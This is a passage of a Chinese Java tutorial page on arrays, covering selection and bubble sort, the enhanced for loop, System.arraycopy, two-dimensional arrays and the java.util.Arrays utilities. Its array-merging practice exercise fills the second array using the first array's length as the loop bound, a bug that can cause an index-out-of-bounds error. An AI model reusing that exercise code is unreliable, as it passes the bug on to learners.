a[i];</span><br><span class="line">                a[i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="comment">//可以发现，最小的一个数，到了最前面</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//第二步： 把第二位的和剩下的所有位进行比较</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;a[<span class="number">1</span>])&#123;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[<span class="number">1</span>];</span><br><span class="line">                a[<span class="number">1</span>] = a[i];</span><br><span class="line">                a[i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="comment">//可以发现，倒数第二小的数，到了第二个位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);       </span><br><span class="line">         </span><br><span class="line">        <span class="comment">//可以发现一个规律</span></span><br><span class="line">        <span class="comment">//移动的位置是从0 逐渐增加的</span></span><br><span class="line">        <span class="comment">//所以可以在外面套一层循环</span></span><br><span class="line">         </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; a.length-<span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> j+<span class="number">1</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]&lt;a[j])&#123;  </span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[j];</span><br><span class="line">                    a[j] = a[i];</span><br><span class="line">                    a[i] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="冒泡排序">冒泡排序</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a [] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">18</span>,<span class="number">62</span>,<span class="number">68</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="comment">//排序前，先把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="comment">//冒泡法排序</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">//第一步：从第一位开始，把相邻两位进行比较</span></span><br><span class="line">        <span class="comment">//如果发现前面的比后面的大，就把大的数据交换在后面</span></span><br><span class="line">          </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length-<span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[i+<span class="number">1</span>])&#123;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[i];</span><br><span class="line">                a[i] = a[i+<span class="number">1</span>];</span><br><span class="line">                a[i+<span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="comment">//可以发现，最大的到了最后面</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//第二步： 再来一次，只不过不用比较最后一位</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length-<span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[i+<span class="number">1</span>])&#123;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[i];</span><br><span class="line">                a[i] = a[i+<span class="number">1</span>];</span><br><span class="line">                a[i+<span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="comment">//可以发现，倒数第二大的到了倒数第二个位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);       </span><br><span class="line">          </span><br><span class="line">        <span class="comment">//可以发现一个规律</span></span><br><span class="line">        <span class="comment">//后边界在收缩</span></span><br><span class="line">        <span class="comment">//所以可以在外面套一层循环</span></span><br><span class="line">          </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; a.length; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length-j-<span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]&gt;a[i+<span class="number">1</span>])&#123;  </span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[i];</span><br><span class="line">                    a[i] = a[i+<span class="number">1</span>];</span><br><span class="line">                    a[i+<span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="增强型for循环">增强型for循环</h3><p>注：增强型for循环只能用来取值，却不能用来修改数组里的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> values [] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">18</span>,<span class="number">62</span>,<span class="number">68</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="comment">//常规遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; values.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">each</span> <span class="operator">=</span> values[i];</span><br><span class="line">            System.out.println(each);</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//增强型for循环遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> each : values) &#123;</span><br><span class="line">            System.out.println(each);</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="复制数组">复制数组</h3><p>把一个数组的值，复制到另一个数组中</p><p>System.arraycopy(src, srcPos, dest, destPos, length)<br>src: 源数组<br>srcPos: 从源数组复制数据的起始位置<br>dest: 目标数组<br>destPos: 复制到目标数组的起始位置<br>length: 复制的长度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a [] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">18</span>,<span class="number">62</span>,<span class="number">68</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">9</span>&#125;;</span><br><span class="line">         </span><br><span class="line">        <span class="type">int</span> b[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];<span class="comment">//分配了长度是3的空间，但是没有赋值</span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">//通过数组赋值把，a数组的前3位赋值到b数组</span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">//方法一： for循环</span></span><br><span class="line">         </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b.length; i++) &#123;</span><br><span class="line">            b[i] = a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//方法二: System.arraycopy(src, srcPos, dest, destPos, length)</span></span><br><span class="line">        <span class="comment">//src: 源数组</span></span><br><span class="line">        <span class="comment">//srcPos: 从源数组复制数据的起始位置</span></span><br><span class="line">        <span class="comment">//dest: 目标数组</span></span><br><span class="line">        <span class="comment">//destPos: 复制到目标数组的启始位置</span></span><br><span class="line">        <span class="comment">//length: 复制的长度       </span></span><br><span class="line">        System.arraycopy(a, <span class="number">0</span>, b, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b.length; i++) &#123;</span><br><span class="line">            System.out.print(b[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习复制数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.MXBean;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Arrs</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span> [] arr_0;</span><br><span class="line">        <span class="type">int</span> [] arr_1;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * <span class="number">10</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp &gt;<span class="number">5</span> &amp;&amp; temp &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                arr_0 = <span class="keyword">new</span> <span class="title class_">int</span>[temp];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * <span class="number">10</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp &gt;<span class="number">5</span> &amp;&amp; temp &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                arr_1 = <span class="keyword">new</span> <span class="title class_">int</span>[temp];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr_0.length; i++)</span><br><span class="line">            arr_0[i] = (<span class="type">int</span>) (Math.random() * <span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr_0.length; i++)</span><br><span class="line">            arr_1[i] = (<span class="type">int</span>) (Math.random() * <span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span> [] new_arr = <span class="keyword">new</span> <span class="title class_">int</span>[arr_0.length + arr_1.length];</span><br><span class="line">        System.arraycopy(arr_0,<span class="number">0</span>,new_arr,<span class="number">0</span>,arr_0.length);</span><br><span class="line">        System.arraycopy(arr_1,<span class="number">0</span>,new_arr,arr_0.length,arr_1.length);</span><br><span class="line"> </span><br><span class="line">        System.out.println(arr_0.length);</span><br><span class="line">        System.out.println(arr_1.length);</span><br><span class="line">        System.out.println(Arrays.toString(arr_0));</span><br><span class="line">        System.out.println(Arrays.toString(arr_1));</span><br><span class="line">        System.out.println(Arrays.toString(new_arr));</span><br><span class="line">        System.out.println(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二维数组">二维数组</h3><p>这是一个<strong>二维数组</strong>，里面的每一个元素，都是一个一维数组<br>所以二维数组又叫数组的数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> b[][] = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;</span><br><span class="line">   &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">   &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;,</span><br><span class="line">   &#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>初始化二维数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">//初始化二维数组，</span></span><br><span class="line">       <span class="type">int</span>[][] a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>]; <span class="comment">//有两个一维数组，每个一维数组的长度是3</span></span><br><span class="line">       a[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">5</span>;  <span class="comment">//可以直接访问一维数组，因为已经分配了空间</span></span><br><span class="line">          </span><br><span class="line">       <span class="comment">//只分配了二维数组</span></span><br><span class="line">       <span class="type">int</span>[][] b = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][]; <span class="comment">//有两个一维数组，每个一维数组的长度暂未分配</span></span><br><span class="line">       b[<span class="number">0</span>]  =<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>]; <span class="comment">//必须事先分配长度，才可以访问</span></span><br><span class="line">       b[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">5</span>;</span><br><span class="line">        </span><br><span class="line">       <span class="comment">//指定内容的同时，分配空间</span></span><br><span class="line">       <span class="type">int</span>[][] c = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;</span><br><span class="line">               &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>&#125;,</span><br><span class="line">               &#123;<span class="number">4</span>,<span class="number">5</span>&#125;,</span><br><span class="line">               &#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;</span><br><span class="line">       &#125;;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Arrays">Arrays</h3><table><thead><tr><th style="text-align:left">关键字</th><th style="text-align:left">简介</th><th style="text-align:left">示例代码</th></tr></thead><tbody><tr><td style="text-align:left">copyOfRange</td><td style="text-align:left">数组复制</td><td style="text-align:left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step1059">示例代码</a></td></tr><tr><td style="text-align:left">toString()</td><td style="text-align:left">转换为字符串</td><td style="text-align:left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step2225">示例代码</a></td></tr><tr><td style="text-align:left">sort</td><td style="text-align:left">排序</td><td style="text-align:left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step1063">示例代码</a></td></tr><tr><td style="text-align:left">binarySearch</td><td style="text-align:left">搜索</td><td style="text-align:left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step1060">示例代码</a></td></tr><tr><td style="text-align:left">equals</td><td style="text-align:left">判断是否相同</td><td style="text-align:left"><a href="https://how2j.cn/k/array/array-arrays/516.html#step1061">示例代码</a></td></tr><tr><td style="text-align:left">fill</td><td style="text-align:left">填充</td><td style="text-align:left"></td></tr></tbody></table><p>数组复制</p><p>System.arraycopy，需要事先准备好目标数组，并分配长度。 copyOfRange 只需要源数组就就可以了，通过返回值，就能够得到目标数组了。<br>除此之外，需要注意的是 copyOfRange 的<strong>第3个参数</strong>，表示源数组的结束位置，是<strong>取不到的</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// copyOfRange(int[] original, int from, int to)</span></span><br><span class="line">        <span class="comment">// 第一个参数表示源数组</span></span><br><span class="line">        <span class="comment">// 第二个参数表示开始位置(取得到)</span></span><br><span class="line">        <span class="comment">// 第三个参数表示结束位置(取不到)</span></span><br><span class="line">        <span class="type">int</span>[] b = Arrays.copyOfRange(a, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; b.length; i++) &#123;</span><br><span class="line">            System.out.print(b[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>转换为字符串</p><p>Arrays提供了一个toString()方法，直接把一个数组，转换为字符串，这样方便观察数组的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> Arrays.toString(a);</span><br><span class="line">        System.out.println(content);</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>排序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;排序之前 :&quot;</span>);</span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">        Arrays.sort(a);</span><br><span class="line">        System.out.println(<span class="string">&quot;排序之后:&quot;</span>);</span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜索</p><p>需要注意的是，使用binarySearch进行查找之前，必须使用sort进行排序<br>如果数组中有多个相同的元素，查找结果是不确定的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line"> </span><br><span class="line">        Arrays.sort(a);</span><br><span class="line"> </span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">        <span class="comment">//使用binarySearch之前，必须先使用sort进行排序</span></span><br><span class="line">        System.out.println(<span class="string">&quot;数字 62出现的位置:&quot;</span>+Arrays.binarySearch(a, <span class="number">62</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断是否相同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span 